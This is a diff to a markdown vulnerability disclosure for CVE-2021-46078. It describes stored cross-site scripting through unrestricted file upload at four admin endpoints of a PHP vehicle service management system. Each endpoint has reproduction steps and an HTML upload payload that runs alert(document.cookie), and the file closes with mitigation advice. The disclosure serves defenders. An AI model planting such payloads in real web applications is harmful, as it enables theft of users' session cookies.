@@ -1,27 +1,24 @@
-# Vehicle Service Management System - 'Multiple' File upload Leads to Stored Cross-Site Scripting
-Vehicle Service Management System - 'Multiple' File upload Leads to Stored Cross-Site Scripting
+# CVE-2021-46078
 
 ### Exploit Title: Vehicle Service Management System - 'Multiple' File upload Leads to Stored Cross-Site Scripting
-### Date: 29/12/2021
-### Exploit Author: P.L.Sanu
-### Exploit Author Website: https://www.plsanu.com
-### Vendor Homepage: https://www.sourcecodester.com
-### Software Link: https://www.sourcecodester.com/php/14972/vehicle-service-management-system-php-free-source-code.html
-### Version: <= 1.0
-### Tested on: Windows 10
-### CVE : 
-### Google Dork: N/A
-### Reference: 
+### Exploit Author: <a href="https://www.plsanu.com">P.L.Sanu</a>
+### CVE: CVE-2021-46078
+### CVSS: 4.8 MEDIUM
+### References: 
 - https://www.plsanu.com/vehicle-service-management-system-multiple-file-upload-leads-to-stored-cross-site-scripting
-- https://github.com/plsanu/Vehicle-Service-Management-System-Multiple-File-upload-Leads-to-Stored-Cross-Site-Scripting
+- https://nvd.nist.gov/vuln/detail/CVE-2021-46078
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-46078
+
+### Description:
+An Unrestricted File Upload vulnerability exists in Sourcecodester Vehicle Service Management System 1.0. A remote attacker can upload malicious files leading to a Stored Cross-Site Scripting vulnerability.
 
 ### 1. Vehicle Service Management System - 'MyAccount' (/admin/?page=user)
 
-### Steps to Reproduce:
+### Exploit:
 1. Login to the admin panel http://localhost/vehicle_service/admin
 2. Navigate to My Account section http://localhost/vehicle_service/admin/?page=user
 
-### Code:
+### Payload:
 ```html
 <!DOCTYPE html>
 <html>
@@ -41,11 +38,11 @@ alert(document.cookie);
 
 ### 2. Vehicle Service Management System - 'User List' (/admin/?page=user/manage_user)
 
-### Steps to Reproduce:
+### Exploit:
 1. Login to the admin panel http://localhost/vehicle_service/admin
 2. Navigate to User List section and click on Create New button.
 
-### Code:
+### Payload:
 ```html
 <!DOCTYPE html>
 <html>
@@ -65,11 +62,11 @@ alert(document.cookie);
 
 ### 3. Vehicle Service Management System - 'Settings-System Logo' (/admin/?page=system_info)
 
-### Steps to Reproduce:
+### Exploit:
 1. Login to the admin panel http://localhost/vehicle_service/admin
 2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
 
-### Code:
+### Payload:
 ```html
 <!DOCTYPE html>
 <html>
@@ -89,11 +86,11 @@ alert(document.cookie);
 
 ### 4. Vehicle Service Management System - 'Settings-Website Cover' (/admin/?page=system_info)
 
-### Steps to Reproduce:
+### Exploit:
 1. Login to the admin panel http://localhost/vehicle_service/admin
 2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
 
-### Code:
+### Payload:
 ```html
 <!DOCTYPE html>
 <html>
@@ -110,3 +107,14 @@ alert(document.cookie);
 5. Click on update button.
 6. Open the Website Cover image in new tab.
 7. Malicious javascript code triggered.
+
+### Impact:
+An attacker can able to upload malicious file in multiple endpoints it leads to Stored Cross-Site Scripting.
+
+### Mitigation:
+It is recommended to implement the following:
+- Never accept a filename and its extension directly without having a white-list filter.
+- If there is no need to have Unicode characters, it is highly recommended to only accept alpha-numeric characters and only one dot as an input for the file name and the extension.
+- Limit the file size to a maximum value in order to prevent denial of service attacks.
+- Uploaded directory should not have any "execute" permission.
+- Don't rely on client-side validation only.
